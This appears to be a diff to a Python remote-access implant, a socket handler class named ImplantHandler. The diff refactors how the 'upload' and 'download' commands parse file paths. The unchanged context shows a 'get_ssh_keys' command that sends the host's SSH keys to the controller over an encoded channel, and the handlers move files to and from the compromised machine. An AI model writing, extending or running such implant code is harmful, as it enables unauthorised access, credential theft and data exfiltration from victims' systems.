@@ -43,13 +43,13 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
                 elif cmd == "get_ssh_keys":
                     self.request.sendall(self.cipher.encode(self.platform.get_ssh_keys()))
                 elif cmd.startswith('upload') == True:
-                    saveMeFile = cmd[7:].split(' ')[1]
+                    args = cmd.split(' ')
                     self.logger.debug("receiving file")
                     
-                    if os.path.isfile(saveMeFile):
+                    if os.path.isfile(args[1]):
                         break 
                     else:  
-                        with open(saveMeFile, 'wb') as f:
+                        with open(args[1], 'wb') as f:
                             self.logger.debug("reading file")
                             while True: 
                                 data = self.cipher.decode(self.request.recv(BUFFER_SIZE))
@@ -65,10 +65,11 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
                                     f.write(data)
                         self.logger.debug("saved file")            
                 elif cmd.startswith('download') == True:
-                    sendMeFile = cmd[9:].split(' ')[0]
+                    #call module download(args[1])
+                    args = cmd.split(' ')
                     self.logger.debug("starting upload")
                     
-                    with open(sendMeFile, 'rb') as f:
+                    with open(args[1], 'rb') as f:
                         self.logger.debug("reading file")
                         while True:
                             data = f.read(BUFFER_SIZE)
